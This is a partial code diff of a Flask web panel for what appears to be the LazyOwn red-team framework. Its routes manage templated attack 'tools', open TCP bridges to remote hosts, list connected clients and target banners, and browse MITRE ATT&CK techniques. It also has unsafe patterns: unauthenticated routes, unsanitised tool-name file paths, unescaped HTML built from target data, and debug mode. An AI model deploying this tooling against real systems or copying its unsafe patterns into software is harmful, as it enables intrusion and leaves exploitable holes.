+    return jsonify({"message": "Notification saved successfully"}), 200
+
+
+@app.route('/edit_event/<event_name>', methods=['GET', 'POST'])
+def edit_event(event_name):
+    response = decoy()
+    if response:
+        return response    
+    event_config = load_event_config()
+
+    event = next((e for e in event_config["events"] if e["name"] == event_name), None)
+
+    if not event:
+        return "Event not found", 404
+
+    if request.method == 'POST':
+        # Actualizar los datos del evento con los datos del formulario
+        event.update({
+            "name": request.form["title"],
+            "src_path": request.form["src_path"],
+            "size": int(request.form["size"]),
+            "description": request.form["description"],
+            "outputtype": request.form["outputtype"],
+            "outputtodelete": request.form["outputtodelete"],
+            "prompt": request.form["prompt"],
+            "operator": request.form["operator"],
+            "status": request.form["status"]
+        })
+        # Guardar los cambios en el archivo JSON
+        with open('event_config.json', 'w') as f:
+            json.dump(event_config, f, indent=4)
+        return redirect(url_for('get_event_config_view'))
+
+    return render_template('edit_event.html', event=event)
+
+@app.route('/event_config', methods=['GET'])
+def get_event_config():
+    event_config = load_event_config()
+    return jsonify(event_config)
+
+@app.route('/event_config_view', methods=['GET', 'POST'])
+def get_event_config_view():
+    response = decoy()
+    if response:
+        return response    
+    if request.method == 'POST':
+        event = {
+            "name": request.form.get("title"),
+            "src_path": request.form.get("src_path"),
+            "size": int(request.form.get("size", 0)),
+            "description": request.form.get("description"),
+            "outputtype": request.form.get("outputtype"),
+            "outputtodelete": request.form.get("outputtodelete"),
+            "prompt": request.form["prompt"],
+            "operator": request.form.get("operator"),
+            "status": request.form.get("status")
+        }
+
+        event_config = load_event_config()
+
+        # Ensure event_config has the correct structure
+        if "events" not in event_config:
+            event_config["events"] = []
+
+        event_config["events"].append(event)
+
+        with open('event_config.json', 'w') as f:
+            json.dump(event_config, f, indent=4)
+
+        return redirect(url_for('get_event_config_view'))
+
+    event_config = load_event_config()
+    return render_template('event_config_view.html', event_config=event_config)
+
+@app.route('/aicmd', methods=['GET'])
+def aicmd_view():
+    cmd = request.args.get('arg')
+
+    INVALID = "Unknown command"
+    
+    if cmd == "1":
+        command = "ping"
+    elif cmd == "2":
+        command = "gospider ssl"
+    else:
+        command = INVALID
+    
+    if command != INVALID:
+        response = aicmd(command)
+
+        return jsonify(response)
+    else:
+        return jsonify({"error": "Arg not allowed"}), 400
+
+@app.route('/events', methods=['GET'])
+def get_events():
+    client_ip = request.remote_addr
+    if current_user.is_authenticated:
+        print(f"Autenticated. Wellcome {client_ip}") 
+    else:
+        print("Unautenticated.")
+        return redirect(url_for('login'))    
+    global events
+    event_config = load_event_config()
+    response = {
+        "events": events
+    }
+    global BASE_DIR
+
+    for event in event_config["events"]:
+        response[event["name"]] = {"exist": False}
+
+    for event in event_config["events"]:
+        event_key = event["name"]
+        src_path = event["src_path"].format(BASE_DIR=BASE_DIR, rhost=rhost)
+        size = event["size"]
+
+        matching_events = [
+            e for e in events
+            if e["src_path"] == src_path and e["size"] > size
+        ]
+
+        if matching_events:
+            response[event_key]["exist"] = True
+
+    return jsonify(response)
+
+
+@app.route('/tools', methods=['GET'])
+def list_tools():
+    response = decoy()
+    if response:
+        return response    
+    tools = [f for f in os.listdir(TOOLS_DIR) if f.endswith('.tool')]
+    return render_template('list_tools.html', tools=tools)
+
+
+@app.route('/tools/create', methods=['GET', 'POST'])
+def create_tool():
+    response = decoy()
+    config = load_payload()
+    if response:
+        return response
+    if request.method == 'POST':
+        toolname = request.form['toolname']
+        command = request.form['command']
+        trigger = request.form.getlist('trigger')
+        active = request.form.get('active') == 'true'
+
+        for key, value in config.items():
+            command = command.replace(f'{{{str(key)}}}', str(value))
+
+        tool_data = {
+            "toolname": toolname,
+            "command": command,
+            "trigger": trigger,
+            "active": active
+        }
+
+        tool_path = os.path.join(TOOLS_DIR, f'{toolname}.tool')
+        with open(tool_path, 'w') as file:
+            json.dump(tool_data, file, indent=4)
+
+        return redirect(url_for('list_tools'))
+
+    return render_template('create_tool.html', config=config, current_user=current_user)
+
+@app.route('/tools/<toolname>', methods=['GET'])
+def view_tool(toolname):
+    response = decoy()
+    if response:
+        return response    
+    tool_path = os.path.join(TOOLS_DIR, f'{toolname}.tool')
+    with open(tool_path, 'r') as file:
+        tool_data = json.load(file)
+    return render_template('view_tool.html', tool=tool_data)
+
+@app.route('/tools/<toolname>/update', methods=['GET', 'POST'])
+def update_tool(toolname):
+    response = decoy()
+    config = load_payload()
+    if response:
+        return response    
+    tool_path = os.path.join(TOOLS_DIR, f'{toolname}.tool')
+    if request.method == 'POST':
+        command = request.form['command']
+        trigger = request.form.getlist('trigger')
+        active = request.form.get('active') == 'true'
+        
+        for key, value in config.items():
+            command = command.replace(f'{{{str(key)}}}', str(value))
+
+        tool_data = {
+            "toolname": toolname,
+            "command": command,
+            "trigger": trigger,
+            "active": active
+        }
+
+        with open(tool_path, 'w') as file:
+            json.dump(tool_data, file, indent=4)
+
+        return redirect(url_for('list_tools'))
+
+    with open(tool_path, 'r') as file:
+        tool_data = json.load(file)
+
+    return render_template('edit_tool.html', tool=tool_data, config=config)
+
+@app.route('/tools/<toolname>/delete', methods=['POST'])
+def delete_tool(toolname):
+    response = decoy()
+    if response:
+        return response    
+    tool_path = os.path.join(TOOLS_DIR, f'{toolname}.tool')
+    os.remove(tool_path)
+    return redirect(url_for('list_tools'))
+
+@app.route('/register', methods=['GET', 'POST'])
+def register():
+    response = decoy()
+    if response:
+        return response    
+    if request.method == 'POST':
+        username = request.form.get('username', '').strip()
+        password = request.form.get('password', '').strip()
+
+        if not username or not password:
+            flash('Uername and password is mandatory.', 'error')
+            return redirect(url_for('register'))
+
+        if len(password) < 8:
+            flash('Password at least 8 chars.', 'error')
+            return redirect(url_for('register'))
+
+        users = load_users()
+
+        if any(user['username'] == username for user in users):
+            flash('Username Exist.', 'error')
+            return redirect(url_for('register'))
+        new_user = {
+            'id': len(users) + 1,
+            'username': username,
+            'password_hash': generate_password_hash(password),
+            'elo': 0
+        }
+        users.append(new_user)
+        save_users(users)
+
+        flash('Success, Please Login.', 'success')
+        return redirect(url_for('login'))
+
+    return render_template('register.html')
+
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    response = decoy()
+    if response:
+        return response    
+    if request.method == 'POST':
+        username = request.form.get('username', '').strip()
+        password = request.form.get('password', '').strip()
+
+        users = load_users()
+        user_data = next((user for user in users if user['username'] == username), None)
+
+        if user_data and check_password_hash(user_data['password_hash'], password):
+            user = User(user_data)
+            login_user(user)
+            flash('Wellcome to LazyOwn .', 'success')
+            return redirect(url_for('profile'))
+        else:
+            flash('Error Login incorrect .', 'error')
+
+    return render_template('login.html')
+
+@app.route('/profile')
+@login_required
+def profile():
+    response = decoy()
+    if response:
+        return response    
+    karma_name = get_karma_name(current_user.elo)
+    return render_template('profile.html', user=current_user, karma_name=karma_name)
+
+@app.route('/logout')
+@login_required
+def logout():
+    response = decoy()
+    if response:
+        return response    
+    logout_user()
+    flash('Successfully Logout...', 'success')
+    return redirect(url_for('index'))
+
+@app.route('/aumentar_elo/<int:user_id>', methods=['POST'])
+def aumentar_elo_route(user_id):
+    response = decoy()
+    if response:
+        return response    
+    data = request.get_json()
+    cantidad = data.get('cantidad', 0)
+
+    if cantidad <= 0:
+        return jsonify({"error": "Error elo must be abs."}), 400
+
+    aumentar_elo(user_id, cantidad)
+    return jsonify({"message": f"The Elo {user_id} increased in {cantidad} points."}), 200
+
+@app.route('/banners')
+def banners():
+    response = decoy()
+    if response:
+        return response    
+    banners_json = load_banners()
+
+    html_table = '<table class="table table-dark table-striped">\n'
+    html_table += '  <thead>\n'
+    html_table += '    <tr>\n'
+    html_table += '      <th>Hostname</th>\n'
+    html_table += '      <th>Port</th>\n'
+    html_table += '      <th>Protocol</th>\n'
+    html_table += '      <th>Extra</th>\n'
+    html_table += '      <th>Service</th>\n'
+    html_table += '    </tr>\n'
+    html_table += '  </thead>\n'
+    html_table += '  <tbody>\n'
+
+    for banner in banners_json:
+        html_table += '    <tr>\n'
+        html_table += f'      <td>{banner["hostname"]}</td>\n'
+        html_table += f'      <td>{banner["port"]}</td>\n'
+        html_table += f'      <td>{banner["protocol"]}</td>\n'
+        html_table += f'      <td>{banner["extra"]}</td>\n'
+        html_table += f'      <td>{banner["service"]}</td>\n'
+        html_table += '    </tr>\n'
+
+    html_table += '  </tbody>\n'
+    html_table += '</table>'
+
+    return render_template('banners.html', title="Target's Information", content=html_table)
+
+
+
+@app.route('/mitre')
+def mitre():
+    response = decoy()
+    if response:
+        return response        
+    page_arg = request.args.get('page', '1')
+    page = int(re.sub(r'\D', '', page_arg) or '1')
+    per_page = 10
+
+    mitre_data = load_mitre_data()
+    tactics = [t for t in mitre_data['objects'] if t['type'] == 'x-mitre-tactic']
+    techniques = [t for t in mitre_data['objects'] if t['type'] == 'attack-pattern']
+
+    total = len(techniques)
+    pages = ceil(total / per_page)
+    start = (page - 1) * per_page
+    end = start + per_page
+
+    paginated_techniques = techniques[start:end]
+
+    return render_template('mitre.html', title="MITRE ATT&CK Techniques", tactics=tactics, techniques=paginated_techniques, page=page, pages=pages)
+
+@app.route('/get_connected_clients', methods=['GET'])
+def get_connected_clients():
+    response = decoy()
+    if response:
+        return response
+    global connected_clients
+    connected_clients_list = list(connected_clients)
+    return jsonify({"connected_clients": connected_clients_list})
 
 @app.route('/start_bridge', methods=['POST'])
 @requires_auth
 def start_bridge():
     """Start a TCP bridge to a specified remote host and port."""
+    response = decoy()
+    if response:
+        return response    
     local_port = int(request.form['local_port'])
     remote_host = request.form['remote_host']
     remote_port = int(request.form['remote_port'])
@@ -896,52 +1760,33 @@ def start_bridge():
 
     return jsonify({"status": "success", "message": f"TCP bridge started on port {local_port} to {remote_host}:{remote_port}"}), 200
 
-def tcp_bridge(local_port, remote_host, remote_port):
-    """Establish a TCP bridge between a local port and a remote host."""
-    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server_socket.bind(('0.0.0.0', local_port))
-    server_socket.listen(5)
-    print(f"[*] Listening for connections on port {local_port}...")
+@app.errorhandler(404)
+def page_not_found(e):
+    response = decoy()
+    if response:
+        return response    
+    return render_template('404.html'), 404
 
-    while True:
-        client_socket, addr = server_socket.accept()
-        print(f"[INFO] Accepted connection from {addr}")
-
-        threading.Thread(target=handle_client, args=(client_socket, remote_host, remote_port)).start()
-
-def handle_client(client_socket, remote_host, remote_port):
-    """Handle communication between the client and the remote server."""
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
-        server_socket.connect((remote_host, remote_port))
-
-        while True:
-
-            client_data = client_socket.recv(4096)
-            if not client_data:
-                break
-            server_socket.sendall(client_data)
-
-            server_data = server_socket.recv(4096)
-            if not server_data:
-                break
-            client_socket.sendall(server_data)
-
-    client_socket.close()
-def secure_filename(filename):
-    """
-    Sanitize the filename to prevent directory traversal and unauthorized access.
-
-    :param filename: The original filename from the upload.
-    :return: A sanitized filename that is safe for storage.
-    """
-    filename = re.sub(r'[^a-zA-Z0-9_.-]', '_', filename)
-    return filename[:255]
+@app.errorhandler(500)
+def internal_server_error(e):
+    response = decoy()
+    if response:
+        return response    
+    return render_template('500.html'), 500
 
 if __name__ == '__main__':
     path = os.getcwd().replace("modules", "sessions" )
     uploads = f"{path}/uploads"
     dns_thread = threading.Thread(target=start_dns_server, daemon=True)
     dns_thread.start()
+    watching_thread = threading.Thread(target=start_watching, daemon=True)
+    watching_thread.start()
     if not os.path.exists(uploads):
         os.makedirs(uploads)
-    app.run(host='0.0.0.0', port=lport, ssl_context=('cert.pem', 'key.pem'))
+
+    if ENV == 'PROD':
+        app.run(host='0.0.0.0', port=lport, ssl_context=('cert.pem', 'key.pem'))
+    else:
+        app.run(debug=True)
+
+    
